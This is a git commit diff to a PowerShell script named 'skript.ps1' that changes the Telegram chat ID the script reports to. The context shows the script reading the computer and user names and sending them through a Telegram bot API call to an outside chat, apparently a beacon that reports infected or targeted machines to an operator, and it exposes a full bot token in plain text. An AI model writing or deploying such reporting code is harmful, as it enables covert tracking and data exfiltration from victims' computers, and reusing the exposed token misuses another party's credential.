6bf5b65f6648c9814194996e24f7c096528e1681
4ertilla <94437106+4ertilla@users.noreply.github.com>
2025-05-12 17:51:31 +0300

    Update skript.ps1

--- skript.ps1
+++ skript.ps1
@@ -9,7 +9,7 @@ $userName = $env:USERNAME
 
 # Отправляем сообщение через Telegram
 $token = '8052149056:AAFS0uIZMO1NvlUaoHBZ8qxUnaY-kO5eQk8'
-$chat_id = '-1008052149056'
+$chat_id = '-496968325'
 $msg = [uri]::EscapeDataString("PC: $pcName | User: $userName")
 Invoke-RestMethod -Uri "https://api.telegram.org/bot $token/sendMessage?chat_id=$chat_id&text=$msg"
 
